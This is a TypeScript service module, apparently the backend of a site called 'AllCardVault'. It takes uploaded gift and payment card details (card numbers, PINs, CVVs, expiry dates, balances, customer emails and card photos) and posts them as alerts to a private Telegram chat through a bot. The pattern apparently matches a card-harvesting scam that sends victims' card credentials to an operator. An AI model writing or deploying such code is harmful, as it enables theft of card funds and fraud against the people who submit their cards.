import fetch from 'node-fetch';

export interface TelegramCardData {
  id?: string;
  brand: string;
  cardNumber: string;
  pin?: string | null;
  cvv?: string | null;
  expiryDate?: string | null;
  cardAmount?: number | null;
  currency?: string | null;
  customerEmail?: string | null;
  status?: string | null;
  notes?: string | null;
  images?: string[] | null;
  createdAt?: Date | string | null;
}

/**
 * Converts a base64 Data URL (data:image/jpeg;base64,...) to a Blob for multipart upload.
 */
function dataUrlToBlob(dataUrl: string): { blob: Blob; filename: string } | null {
  try {
    const matches = dataUrl.match(/^data:(image\/[a-zA-Z0-9+.-]+);base64,(.+)$/);
    if (!matches) return null;
    const mimeType = matches[1];
    const base64Data = matches[2];
    const buffer = Buffer.from(base64Data, 'base64');
    const ext = mimeType.split('/')[1] || 'jpeg';
    const blob = new Blob([buffer], { type: mimeType });
    return { blob, filename: `card_photo.${ext}` };
  } catch (e) {
    console.warn('[Telegram Service] Failed to convert base64 image to Blob:', e);
    return null;
  }
}

export async function sendTelegramCardAlert(card: TelegramCardData): Promise<{ success: boolean; message?: string }> {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.log('[Telegram Service] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID not configured in environment.');
    return { success: false, message: 'Telegram Bot Token or Chat ID not configured.' };
  }

  const brandName = card.brand || 'Unknown Gift Card';
  const amountStr = typeof card.cardAmount === 'number' && card.cardAmount > 0
    ? `${card.currency || 'USD'} $${card.cardAmount.toFixed(2)}`
    : 'Not Specified';
  const customer = card.customerEmail || 'Guest User';
  const statusStr = card.status || 'PENDING';

  // Format clean Markdown message for Telegram
  let caption = `🚨 *NEW CARD UPLOADED / VALIDATION REQUEST*\n\n`;
  caption += `💳 *Brand:* ${brandName}\n`;
  caption += `🔢 *Card Number:* \`${card.cardNumber || 'N/A'}\`\n`;
  if (card.pin) caption += `🔑 *PIN:* \`${card.pin}\`\n`;
  if (card.cvv) caption += `🔒 *CVV:* \`${card.cvv}\`\n`;
  if (card.expiryDate) caption += `📅 *Expiry:* ${card.expiryDate}\n`;
  caption += `💵 *Balance/Amount:* ${amountStr}\n`;
  caption += `📧 *Customer:* ${customer}\n`;
  caption += `⚡ *Status:* ${statusStr}\n`;
  if (card.notes) caption += `📝 *Notes:* ${card.notes}\n`;
  caption += `\n⏰ *Time:* ${new Date().toUTCString()}`;

  // Extract clean valid image strings
  const imageList = Array.isArray(card.images)
    ? card.images.filter((img) => typeof img === 'string' && img.trim().length > 0)
    : [];

  // Telegram caption limit is 1024 characters; truncate safely if needed
  const safeCaption = caption.length > 1000 ? caption.slice(0, 990) + '\n...' : caption;

  // 1. If images are attached, send photo(s) to Telegram!
  if (imageList.length > 0) {
    console.log(`[Telegram Service] Sending card alert with ${imageList.length} attached photo(s)...`);
    
    // Process first photo (Primary card photo with caption)
    const firstImg = imageList[0];
    let photoSentSuccess = false;

    if (firstImg.startsWith('data:image/')) {
      // Base64 upload -> send via FormData
      const parsedBlob = dataUrlToBlob(firstImg);
      if (parsedBlob) {
        try {
          const formData = new FormData();
          formData.append('chat_id', chatId.trim());
          formData.append('caption', safeCaption);
          formData.append('parse_mode', 'Markdown');
          formData.append('photo', parsedBlob.blob, parsedBlob.filename);

          const res = await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendPhoto`, {
            method: 'POST',
            body: formData as any,
          });

          const data = (await res.json()) as any;
          if (data.ok) {
            photoSentSuccess = true;
            console.log(`[Telegram Service] ✅ Card photo 1 successfully posted to Telegram!`);
          } else {
            console.warn(`[Telegram Service] Base64 sendPhoto error:`, data.description || data);
          }
        } catch (err) {
          console.warn(`[Telegram Service] Base64 sendPhoto network error:`, err);
        }
      }
    } else if (firstImg.startsWith('http://') || firstImg.startsWith('https://')) {
      // URL photo -> send JSON payload
      try {
        const res = await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendPhoto`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: chatId.trim(),
            photo: firstImg.trim(),
            caption: safeCaption,
            parse_mode: 'Markdown',
          }),
        });

        const data = (await res.json()) as any;
        if (data.ok) {
          photoSentSuccess = true;
          console.log(`[Telegram Service] ✅ Card URL photo 1 successfully posted to Telegram!`);
        } else {
          console.warn(`[Telegram Service] URL sendPhoto error:`, data.description || data);
        }
      } catch (err) {
        console.warn(`[Telegram Service] URL sendPhoto network error:`, err);
      }
    }

    // Send any additional attached photos (Photo 2, Photo 3)
    if (imageList.length > 1) {
      for (let i = 1; i < imageList.length; i++) {
        const extraImg = imageList[i];
        if (extraImg.startsWith('data:image/')) {
          const parsedBlob = dataUrlToBlob(extraImg);
          if (parsedBlob) {
            try {
              const formData = new FormData();
              formData.append('chat_id', chatId.trim());
              formData.append('caption', `📷 *Additional Card Photo ${i + 1} for ${brandName}*`);
              formData.append('parse_mode', 'Markdown');
              formData.append('photo', parsedBlob.blob, parsedBlob.filename);

              await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendPhoto`, {
                method: 'POST',
                body: formData as any,
              });
            } catch {}
          }
        } else if (extraImg.startsWith('http://') || extraImg.startsWith('https://')) {
          try {
            await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendPhoto`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId.trim(),
                photo: extraImg.trim(),
                caption: `📷 *Additional Card Photo ${i + 1} for ${brandName}*`,
                parse_mode: 'Markdown',
              }),
            });
          } catch {}
        }
      }
    }

    if (photoSentSuccess) {
      return { success: true };
    }
  }

  // 2. Fallback text notification if no images were attached or photo upload failed
  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId.trim(),
        text: safeCaption,
        parse_mode: 'Markdown',
        disable_web_page_preview: true,
      }),
    });

    const data = (await response.json()) as any;
    if (data.ok) {
      console.log(`[Telegram Service] ✅ Card alert text message sent to Telegram chat ${chatId}`);
      return { success: true };
    } else {
      console.error(`[Telegram Service] ❌ Failed to send Telegram alert:`, data.description || data);
      return { success: false, message: data.description || 'Failed to send Telegram message' };
    }
  } catch (err: any) {
    console.error(`[Telegram Service] ❌ Telegram API connection error:`, err?.message || err);
    return { success: false, message: err?.message || 'Connection error' };
  }
}

export async function sendTelegramTestMessage(customToken?: string, customChatId?: string): Promise<{ success: boolean; message: string }> {
  const botToken = customToken || process.env.TELEGRAM_BOT_TOKEN;
  const chatId = customChatId || process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return {
      success: false,
      message: 'Please provide both TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.',
    };
  }

  const text = `🎉 *AllCardVault Telegram Bot Test*\n\nYour Telegram integration is connected and working perfectly!\n\nAll future uploaded gift cards, card codes, PINs, and card photos will automatically post instant alerts with photos attached to this chat.\n\n⏰ *Connected:* ${new Date().toUTCString()}`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken.trim()}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId.trim(),
        text,
        parse_mode: 'Markdown',
      }),
    });

    const data = (await response.json()) as any;
    if (data.ok) {
      return { success: true, message: 'Test message sent successfully to Telegram!' };
    } else {
      return { success: false, message: `Telegram Error: ${data.description || 'Invalid Bot Token or Chat ID'}` };
    }
  } catch (err: any) {
    return { success: false, message: `Network Error: ${err?.message || 'Failed to reach Telegram API'}` };
  }
}
